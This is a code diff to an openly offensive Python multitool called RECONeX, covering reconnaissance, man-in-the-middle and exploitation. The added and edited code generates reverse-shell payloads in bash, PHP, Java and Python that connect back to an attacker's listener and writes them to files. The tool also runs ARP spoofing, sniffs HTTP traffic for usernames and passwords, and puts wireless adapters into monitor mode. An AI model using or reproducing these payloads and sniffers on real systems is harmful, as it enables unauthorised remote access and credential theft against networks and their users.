@@ -1,5 +1,5 @@
 from __future__ import print_function
-
+import urllib.request, urllib.error, urllib.parse
 import subprocess
 from bs4 import BeautifulSoup
 import nmap
@@ -10,8 +10,6 @@ from termcolor import colored
 import ipaddress
 from datetime import datetime
 import requests
-from urllib.parse import urljoin
-#from urlparse import urljoin
 import scapy.all as scapy
 from scapy.layers import http
 import sys
@@ -19,7 +17,7 @@ import os
 import pyperclip3 as pc
 from itertools import product
 import time
-
+import readline
 def load_animation():
 
     print('---------------------------------------------')
@@ -69,6 +67,7 @@ if __name__ == '__main__':
     load_animation()
 print('\n')
 
+#############################################################################################################################################################
 
 def extract_links():
     print("******************************")
@@ -189,6 +188,35 @@ def port_scan():
         print("\nCtrl + C pressed............. Quitting. ")
         IGoperation()
 
+def banner_grab():
+    print("******************************")
+    print("*  RECONeX's Banner Grabber  * ")
+    print("******************************")
+    try:
+        host2 = input("Enter the full URL starts with HTTP or HTTPS \n Enter Url Here => :")
+        c = urllib.request.urlopen(host2)
+        print(c.info())
+        print(c.getcode())
+
+        choice = input("Do you want to continue(y/n):- ")
+        if choice == 'y':
+            banner_grab()
+        elif choice == 'n':
+            IGoperation()
+        else:
+            print("Enter y or n:--")
+
+
+    except KeyboardInterrupt:
+        print("\n")
+        choice = input("Do you want to continue(y/n):- ")
+        if choice == 'y':
+            banner_grab()
+        elif choice == 'n':
+            IGoperation()
+        else:
+            print("Enter y or n:--")
+
 def subdomain_crawl():
     print("*********************************")
     print("*  RECONeX's Subdomain Crawler  * ")
@@ -299,7 +327,7 @@ def IGoperation():
     print("{3} Hidden Files & Directories Crawler |")
     print("{4} Subdomain Crawler                  |")
     print("{5} Extract Links from Website         |")
-    print("{6} Google Dorking(**)                 |")
+    print("{6} Banner Grabbing                    |")
     print("{7} Exit from Info. Gather. Mode       |")
     print("----------------------------------------")
     choose = input("Enter your choice:-")
@@ -314,14 +342,16 @@ def IGoperation():
     elif choose == '5':
         extract_links()
     elif choose == '6':
-        print("Under Construction")
-        IGoperation()
+        banner_grab()
     elif choose == '7':
         grandoperation()
     else:
         print("Enter Valid Input")
         IGoperation()
 
+###################################################################END OF RECON SUITE#######################################################################
+
+##########################################################START OF MITM SUITE###########################################################
 def arp_spoof():
     print("***************************")
     print("* RECONeX's ARP Spoofer *")
@@ -391,7 +421,7 @@ def packet_sniff():
         def get_login_info(packet):
             if packet.haslayer(scapy.Raw):
                 load = packet[scapy.Raw].load
-                keywords = ['login', 'LOGIN', 'user', 'pass', 'username', 'password', 'Login']
+                keywords = ['login', 'LOGIN', 'user', 'pass', 'Username', 'Password', 'Login']
                 for keyword in keywords:
                     if keyword in load:
                         return load
@@ -399,10 +429,10 @@ def packet_sniff():
         def process_sniffed_packet(packet):
             if packet.haslayer(http.HTTPRequest):
                 url = geturl(packet)
-                print("[+]HTTPRequest > " + str(url))
+                print("[+]HTTPRequest > " + url.decode("utf-8"))
                 logininfo = get_login_info(packet)
                 if logininfo:
-                    print("\n\n[+]Possible username and password " + str(logininfo) + "\n\n")
+                    print("\n\n[+]Possible username and password " + string.decode(logininfo) + "\n\n")
 
         sniff(interface)
 
@@ -473,7 +503,8 @@ def MITMoperation():
         print("{1} Network Scanner           |")
         print("{2} ARP Spoofer               |")
         print("{3} Packet Sniffer            |")
-        print("{4} Exit from Attack Mode     |")
+        print("{4} Wireless Exploitation     |")
+        print("{5} Exit from Attack Mode     |")
         print("-------------------------------")
         choose = input("Enter your choice:-")
         if choose == '1':
@@ -482,9 +513,13 @@ def MITMoperation():
             arp_spoof()
         elif choose == '3':
             packet_sniff()
-        elif choice == 'ifconfig':
-            os.system('ifconfig')
         elif choose == '4':
+            wirelessexp()
+        elif choose == 'ifconfig':
+            os.system("ifconfig")
+            time.sleep(5)
+            MITMoperation()
+        elif choose == '5':
             subprocess.call(["service", "apache2", "stop"])
             time.sleep(2)
             print(colored("Man in the Middle Attack [MODE OFF]", 'green'))
@@ -492,6 +527,10 @@ def MITMoperation():
         else:
             print("Enter Valid Input")
             MITMoperation()
+
+#################################################END OF MITM SUITE##############################################################################
+
+#################################################START OF EXPLOITATION SUITE########################################################################
 
 dictionary = { 'a': ['a','A','@','4'],'b': ['b','B','8','6'],'c': ['c','C','[','{','(','<'], 'd': ['d','D',], 'e': ['e','E','3'], 'f': ['f','F'], 'g': ['g','G','6','9'], 'h': ['h','H','#'], 'i': ['i','I','1','l','L','|','!'], 'j': ['j','J'], 'k': ['k','K'], 'l': ['l','L','i','I','|','!','1'], 'm': ['m','M'], 'n': ['n','N'], 'o': ['o','O','0','Q'], 'p': ['p','P'], 'q': ['q','Q','9','0','O'], 'r': ['r','R'], 's': ['s','S','$','5'], 't': ['t','T','+','7'], 'u': ['u','U','v','V'], 'v': ['v','V','u','U'], 'w': ['w','W'], 'x': ['x','X','+'], 'y': ['y','Y'], 'z': ['z','Z','2'], }
 dummychars = ['1','2','3','4','5','6','7','8','9','0','!','@','#','$','%','^','&','*','?']
@@ -654,7 +693,7 @@ def keygen():
 			elif choose == '3':
 				passwithnumber()
 			elif choose == '4':
-				grandop()
+				ExploitOperation()
 			elif choose == 'clear':
 				os.system('clear')
 			elif choose == 'ifconfig':
@@ -679,7 +718,7 @@ def revgen():
         print("-------------------------------------------------------------------")
         print("""|1. bash reverse shell      2. php reverse shell                  |
 | 3. java reverse shell     4. python reverse shell (for Linux)   |
-| 5. powershell windows reverse shell                             |""")
+| 5. Back to menu                                                 |""")
         print("-------------------------------------------------------------------")
         Shelltype = input("Shell#\t")
         if Shelltype == '1':
@@ -691,7 +730,7 @@ def revgen():
         elif Shelltype == '4':
             pythonshell()
         elif Shelltype == '5':
-            powerwinshell()
+            ExploitOperation()
         elif Shelltype == 'clear':
             os.system('clear')
             revgen()
@@ -715,7 +754,7 @@ def bashshell():
         print("-------------------------------")
         print("|   1. Bash TCP    |")
         print("|   2. Bash UDP    |")
-        print("|   3. Back    |")
+        print("|   3. Back        |")
         print("--------------------")
         bashpayload = input("Use Payload Type:-")
         if bashpayload == '1':
@@ -751,20 +790,20 @@ def bashshellTCP():
         if bashshellTCPchoice == '1':
             shell = ("bash -i >& /dev/tcp/%s/%s 0>&1" % (lhost , lport))
             outputFile = input("Enter Shell file Name:-")
-            with open(outputFile, 'w') as f:
-                f.write('\n'.join(shell))
+            with open(outputFile + '.sh', 'w') as f:
+                f.write(''.join(shell))
             print('Reverse shell is generated as %s.sh' % outputFile)
         elif bashshellTCPchoice == '2':
             shell = ("0<&196;exec 196<>/dev/tcp/%s/%s; sh <&196 >&196 2>&196" % (lhost , lport))
             outputFile = input("Enter Shell file Name:-")
-            with open(outputFile, 'w') as f:
-                f.write('\n'.join(shell))
+            with open(outputFile + '.sh', 'w') as f:
+                f.write(''.join(shell))
             print('Reverse shell is generated as %s.sh' % outputFile)
         elif bashshellTCPchoice == '3':
             shell = ("/bin/bash -l > /dev/tcp/%s/%s 0<&1 2>&1" % (lhost , lport))
             outputFile = input("Enter Shell file Name:-")
-            with open(outputFile, 'w') as f:
-                f.write('\n'.join(shell))
+            with open(outputFile + '.sh', 'w') as f:
+                f.write(''.join(shell))
             print('Reverse shell is generated as %s.sh' % outputFile)
         else:
             print("These are the only available shell scripts")
@@ -802,8 +841,8 @@ def bashshellUDP():
         lport = input("Please enter the listener port(from 0-65536):-")
         shell = ("bash -i >& /dev/tcp/%s/%s 0>&1" % (lhost , lport))
         outputFile = input("Enter Shell file Name:-")
-        with open(outputFile, 'w') as f:
-            f.write('\n'.join(shell))
+        with open(outputFile + '.sh', 'w') as f:
+            f.write(''.join(shell))
         print('Reverse shell is generated as %s.sh' % outputFile)
         choice = input("Want to Continue? (y/n/exit):\t ")
         if choice == 'y':
@@ -844,50 +883,50 @@ def phpshell():
         if phpshellchoice == '1':
             shell = ("""php -r '$sock=fsockopen("%s",80);" exec "/bin/sh -i <&3 >&3 2>&3" ;'""" % (lhost , lport) )
             outputFile = input("Enter Shell file Name:-")
-            with open(outputFile, 'w') as f:
-                f.write('\n'.join(shell))
+            with open(outputFile + '.php', 'w') as f:
+                f.write(''.join(shell))
             print('Reverse shell is generated as %s.php' % outputFile)
 
         elif phpshellchoice == '2':
             shell = ("""php -r '$sock=fsockopen("%s",80);shell_exec("/bin/sh -i <&3 >&3 2>&3");'""" % ( lhost, lport))
             outputFile = input("Enter Shell file Name:-")
-            with open(outputFile, 'w') as f:
-                f.write('\n'.join(shell))
+            with open(outputFile + '.php', 'w') as f:
+                f.write(''.join(shell))
             print('Reverse shell is generated as %s.php' % outputFile)
 
         elif phpshellchoice == '3':
             shell = ("""php -r '$sock=fsockopen("%s",%s);`/bin/sh -i <&3 >&3 2>&3`;'""" % (lhost, lport))
             outputFile = input("Enter Shell file Name:-")
-            with open(outputFile, 'w') as f:
-                f.write('\n'.join(shell))
+            with open(outputFile + '.php', 'w') as f:
+                f.write(''.join(shell))
             print('Reverse shell is generated as %s.php' % outputFile)
 
         elif phpshellchoice == '4':
             shell = ("""php -r '$sock=fsockopen("%s",%s);system("/bin/sh -i <&3 >&3 2>&3");'""" % (lhost, lport))
             outputFile = input("Enter Shell file Name:-")
-            with open(outputFile, 'w') as f:
-                f.write('\n'.join(shell))
+            with open(outputFile + '.php', 'w') as f:
+                f.write(''.join(shell))
             print('Reverse shell is generated as %s.php' % outputFile)
 
         elif phpshellchoice == '5':
             shell = ("""php -r '$sock=fsockopen("%s",%s);passthru("/bin/sh -i <&3 >&3 2>&3");'""" % (lhost, lport))
             outputFile = input("Enter Shell file Name:-")
-            with open(outputFile, 'w') as f:
-                f.write('\n'.join(shell))
+            with open(outputFile + '.php', 'w') as f:
+                f.write(''.join(shell))
             print('Reverse shell is generated as %s.php' % outputFile)
 
         elif phpshellchoice == '6':
             shell = ("""php -r '$sock=fsockopen("%s",%s);popen("/bin/sh -i <&3 >&3 2>&3", "r");'""" % (lhost, lport))
             outputFile = input("Enter Shell file Name:-")
-            with open(outputFile, 'w') as f:
-                f.write('\n'.join(shell))
+            with open(outputFile + '.php', 'w') as f:
+                f.write(''.join(shell))
             print('Reverse shell is generated as %s.php' % outputFile)
 
         elif phpshellchoice == '7':
             shell = ("""php -r '$sock=fsockopen("%s",%s);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'""" % (lhost, lport))
             outputFile = input("Enter Shell file Name:-")
-            with open(outputFile, 'w') as f:
-                f.write('\n'.join(shell))
+            with open(outputFile + '.php', 'w') as f:
+                f.write(''.join(shell))
             print('Reverse shell is generated as %s.php' % outputFile)
 
         else:
@@ -937,8 +976,8 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 Process p = r.exec("/bin/bash -c 'exec 5<>/dev/tcp/%s/%s;cat <&5 | while read line; do $line 2>&5 >&5; done'");
 p.waitFor()""" % (lhost, lport))
             outputFile = input("Enter Shell file Name:-")
-            with open(outputFile, 'w') as f:
-                f.write('\n'.join(shell))
+            with open(outputFile + '.java', 'w') as f:
+                f.write(''.join(shell))
             print('Reverse shell is generated as %s.java' % outputFile)
         elif javashellchoice == '2':
             shell = ("""String host="%s";
@@ -946,12 +985,15 @@ int port=%s;
 String cmd="cmd.exe";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();""" % (
             lhost, lport))
-            javasavefile()
+            outputFile = input("Enter Shell file Name:-")
+            with open(outputFile + '.java', 'w') as f:
+                f.write(''.join(shell))
+            print('Reverse shell is generated as %s.java' % outputFile)
         else:
             print("These are the only available shell scripts")
             outputFile = input("Enter Shell file Name:-")
-            with open(outputFile, 'w') as f:
-                f.write('\n'.join(shell))
+            with open(outputFile + '.java', 'w') as f:
+                f.write(''.join(shell))
             print('Reverse shell is generated as %s.java' % outputFile)
 
         choice = input("Want to Continue? (y/n/exit):\t ")
@@ -969,8 +1011,85 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
         print("\nCtrl + C pressed............. Quitting. ")
     ExploitOperation()
 
+def pythonshell():
+    try:
+        print("---------------------------------")
+        print("|  Available Payloads (Python)  |")
+        print("---------------------------------")
+        print("""(A)python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
+(B)python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+(C)python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{PORT}));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+(D)python -c 'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'""")
+        while True:
+            lhost = input("Please enter the ip address to listen from(e.g. 0.0.0.0.) :-")
+            try:
+                ip_address_obj = ipaddress.ip_address(lhost)
+                print("Valid IP address")
+                break
+            except:
+                print("Invalid IP address")
+
+        lport = input("Please enter the listener port(from 0-65536):-")
+        pythonshellchoice = input("Use shell no.>\t")
+        if pythonshellchoice == '1':
+            shell = ("""python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'""" % (lhost , lport) )
+            outputFile = input("Enter Shell file Name:-")
+            with open(outputFile + '.py', 'w') as f:
+                f.write(''.join(shell))
+            print('Reverse shell is generated as %s.py' % outputFile)
+
+        elif pythonshellchoice == '2':
+            shell = ("""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'""" % ( lhost, lport))
+            outputFile = input("Enter Shell file Name:-")
+            with open(outputFile + '.py', 'w') as f:
+                f.write(''.join(shell))
+            print('Reverse shell is generated as %s.py' % outputFile)
+
+        elif pythonshellchoice == '3':
+            shell = ("""python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'""" % (lhost, lport))
+            outputFile = input("Enter Shell file Name:-")
+            with open(outputFile + '.py', 'w') as f:
+                f.write(''.join(shell))
+            print('Reverse shell is generated as %s.py' % outputFile)
+
+        elif pythonshellchoice == '4':
+            shell = ("""python -c 'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'""" % (lhost, lport))
+            outputFile = input("Enter Shell file Name:-")
+            with open(outputFile + '.py', 'w') as f:
+                f.write(''.join(shell))
+            print('Reverse shell is generated as %s.py' % outputFile)
+
+        else:
+            print("These are the only available shell scripts")
+            pythonshell()
+
+        choice = input("Want to Continue? (y/n/exit):\t ")
+        if choice == 'y':
+            pythonshell()
+        elif choice == 'n':
+            ExploitOperation()
+        elif choice == 'exit':
+            grandoperation()
+        else:
+            print("Enter either y or n")
+
+    except KeyboardInterrupt:
+        print("\n")
+        print("\nCtrl + C pressed............. Quitting. ")
+    except KeyboardInterrupt:
+        ExploitOperation()
+
 
 def ExploitOperation():
+    os.system("clear")
+    f = Figlet(font='slant', width=200)
+    print(colored(f.renderText('RECONeX'), 'green'))
+    print('----------------------------------------------------')
+    print('| A MULTITOOL FOR INFO. GATHERING , EXPLOITATION & |')
+    print('|                Man In The Middle                 |')
+    print('----------------------------------------------------\n')
+    print('\t\t\t\t\t\tAuthor -  MANAV SHARMA\n')
+    time.sleep(2)
     print("---------------------------------------")
     print('|           Modules Present           |')
     print("---------------------------------------")
@@ -1006,7 +1125,7 @@ def ExploitOperation():
             ExploitOperation()
         else:
             print("Enter Valid Choice")
-            grandop()
+            ExploitOperation()
 
     except KeyboardInterrupt:
         time.sleep(2)
@@ -1014,7 +1133,177 @@ def ExploitOperation():
         time.sleep(2)
         print("[+] Process Terminated.........")
 
+############################################END OF EXPLOITATION SUITE#######################################################
 
+#############################################START OF WIRELESS SUITE##############################################################
+
+def interface_scan():
+    wlan_pattern = re.compile("^wlan[0-9]+")
+    check_wifi_result = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())
+
+    if len(check_wifi_result) == 0:
+        print("Please connect a WiFi adapter and try again.")
+        wirelessexp()
+
+    print("Available Interfaces:")
+    for index, item in enumerate(check_wifi_result):
+        print(f"{index} - {item}")
+        time.sleep(2)
+        wirelessexp()
+
+def interface_configure():
+    print("\n [*] --> Updating your system, please wait ....  \n")
+    lines()
+    subprocess.call(['apt', 'update', '-y'], stdout=subprocess.DEVNULL)
+    lines()
+
+    print("\n [*] --> Installing build-essentials, Please wait ....  \n")
+    lines()
+    subprocess.call(['apt', 'install', 'build-essential', '-y'], stdout=subprocess.DEVNULL)
+    lines()
+    print("\n [*] --> Installing bc, Won't take too long :) ....  \n")
+    lines()
+    subprocess.call(['apt', 'install', 'bc', '-y'], stdout=subprocess.DEVNULL)
+    lines()
+    print("\n [*] --> Installing libelf-dev, Please wait ....  \n")
+    lines()
+    subprocess.call(['apt', 'install', 'libelf-dev', '-y'], stdout=subprocess.DEVNULL)
+    lines()
+    print("\n [*] --> Installing the required linux-headers, Please wait .....  \n")
+    lines()
+    subprocess.call("apt install linux-headers-$(uname -r)", shell=True)
+    lines()
+    print("\n [*] --> Removing \"r8188eu.ko module\"  \n")
+    subprocess.call(['rmmod', 'r8188eu.ko'], stdout=subprocess.DEVNULL)
+    print("\n [*] --> Git cloning \"rtl8188eus\"  \n")
+    lines()
+    unamer = subprocess.check_output(['uname','-r'])
+    unamerr = re.search(r"\d.\d\d", str(unamer))
+    if unamerr is None:
+        subprocess.call(['git', 'clone', 'https://github.com/aircrack-ng/rtl8188eus'], stdout=subprocess.DEVNULL)
+    elif unamerr.group(0) >= "5.15":
+        subprocess.call(['git', 'clone', 'https://github.com/drygdryg/rtl8188eus.git'], stdout=subprocess.DEVNULL)
+    else:
+        subprocess.call(['git', 'clone', 'https://github.com/aircrack-ng/rtl8188eus'], stdout=subprocess.DEVNULL)
+    lines()
+    print("\n [*] --> Installing dkms, please wait ..... ")
+    print(" [Info] --> If dkms installation timed out after 30 seconds, the tool would exit with error and you need to upgrade your Kali with the \"sudo apt upgrade -y\" CL \n")
+    subprocess.call(['apt', 'install', 'dkms'], stdout=subprocess.DEVNULL, timeout=30)
+    lines()
+    print("\n [*] --> Done installing dkms. proceeding further ....  \n")
+    os.chdir("rtl8188eus")
+    lines()
+    print("\n [*] --> Echoing \"blacklist r8188eu.ko\" to \"realtek.conf\"  \n")
+    subprocess.call("echo \"blacklist r8188eu.ko\" > \"/etc/modprobe.d/realtek.conf\"", shell=True)
+    subprocess.call("echo \"blacklist 8188eu.ko\" > \"/etc/modprobe.d/realtek.conf\"", shell=True)
+    lines()
+    print("\n [*] --> Running Make command, Will take few minutes, please wait and ignore the upcoming errors and warnings ......  \n")
+    lines()
+    subprocess.call(['make'], stdout=subprocess.DEVNULL)
+    lines()
+    print("\n [*] --> Running Make Install command  \n")
+    lines()
+    subprocess.call(['make', 'install'], stdout=subprocess.DEVNULL)
+    lines()
+    print("\n [*] --> Running \"modprobe 8188eu\"  \n")
+    lines()
+    subprocess.call("modprobe 8188eu", shell=True)
+    iwco = subprocess.check_output(['iwconfig'])
+    Auto_check = re.search(r"Mode:Auto", str(iwco))
+    if not Auto_check:
+        lines()
+        print("\n [Warning] --> The WiFi adapter mode is not Auto or it is just missing. ")
+        print(" [Instruction] --> UnPlug and plug in your WiFi USB adapter, wait for few seconds then run the tool again with root - Bye bye :)   \n")
+        lines()
+        wirelessexp()
+    if Auto_check is not None:
+        lines()
+        print("\n [Congrats] --> The WiFi USB adapter is successfully configured \n")
+        asking = input("\n [Permission] --> Would you like to set your WiFi USB adapter to Monitor mode now?  [yes / no] ")
+        lines()
+        if asking.lower() == 'y' or asking.lower() == 'yes':
+            tp_set()
+        elif asking.lower() == 'n' or asking.lower() == 'no':
+            lines()
+            print("\n [Info] --> Now your adapter is just set to Auto mode - Bye Bye :) \n")
+            TheEnd()
+        else:
+            lines()
+            print("\n [Warning] --> Invalid Entry. [Your interface is just set to Auto mode] - Exiting .....\n")
+            wirelessexp()
+
+def lines():
+    print("-------------------------------------------------------------------------------------------------------")
+
+def getinterf():
+    interfs = subprocess.getoutput('iwconfig |grep WIFI@REALTEK')
+    interf = re.search(r"\w\w\w\w\d", str(interfs))
+    interff = re.search(r"\w\w\w\d", str(interfs))
+    enforc = re.search(r"WIFI@REALTEK", str(interfs))
+    if interf and enforc:
+        return interf.group(0)
+    elif interff and enforc:
+        return interff.group(0)
+    else:
+        lines()
+        print(" [Warning] --> Couldn't read your adapter, please make sure that your adapter is plugged in - Exiting .......")
+        wirelessexp()
+def enable_monitor():
+    interf = getinterf()
+    subprocess.call(['ifconfig', interf, 'down'])
+    subprocess.call("airmon-ng check kill", shell=True)
+    subprocess.call(['iwconfig', interf, 'mode', 'monitor'])
+    subprocess.call(['ifconfig', interf, 'up'])
+    tp_check()
+def tp_check():
+    interff = getinterf()
+    iwcon = subprocess.getoutput("iwconfig"+interff)
+    iwcon_Mcheck = re.search(r"Monitor",str(iwcon))
+    if iwcon_Mcheck is not None:
+        lines()
+        print("\n [Congrats] --> You WiFi USB adapter has been set to monitor mode :) :) \n")
+def wirelessexp():
+    os.system("clear")
+
+    f = Figlet(font='slant', width=200)
+    print(colored(f.renderText('RECONeX'), 'green'))
+    print('----------------------------------------------------')
+    print('| A MULTITOOL FOR INFO. GATHERING , EXPLOITATION & |')
+    print('|                Man In The Middle                 |')
+    print('----------------------------------------------------\n')
+    print('\t\t\t\t\t\tAuthor -  MANAV SHARMA\n')
+    print(colored(' Suggested :- Use Multiple terminals to use M.I.T.M. Tools', 'yellow'))
+    time.sleep(2)
+    choose = 0
+    while (choose != '5'):
+        time.sleep(1)
+        print("-----------------------------------------------------")
+        print("|             Wireless Exploitation Menu            |")
+        print("-----------------------------------------------------")
+        print("{1} Available Interfaces                            |")
+        print("{2} Configure the interface (Only supports TP-LInk) |")
+        print("{3} Enable Monitor Mode                             |")
+        print("{4} Exit from Attack Mode                           |")
+        print("-----------------------------------------------------")
+        choose = input("Enter your choice:-")
+        if choose == '1':
+            interface_scan()
+        elif choose == '2':
+            interface_configure()
+        elif choose == '3':
+            enable_monitor()
+        elif choose == 'iwconfig':
+            os.system("iwconfig")
+            time.sleep(3)
+            wirelessexp()
+        elif choose == '4':
+            print(colored("Wireless Attack [MODE OFF]", 'green'))
+            MITMoperation()
+        else:
+            print("Enter Valid Input")
+            wirelessexp()
+
+############################################END OF WIRELESS SUITE#################################################################
 
 
 
@@ -1058,6 +1347,7 @@ def grandoperation():
             print("You choice Exploitation Mode")
             time.sleep(2)
             print(colored("Exploitation [MODE ON]", 'blue'))
+            time.sleep(2)
             ExploitOperation()
 
         elif choice == '4':
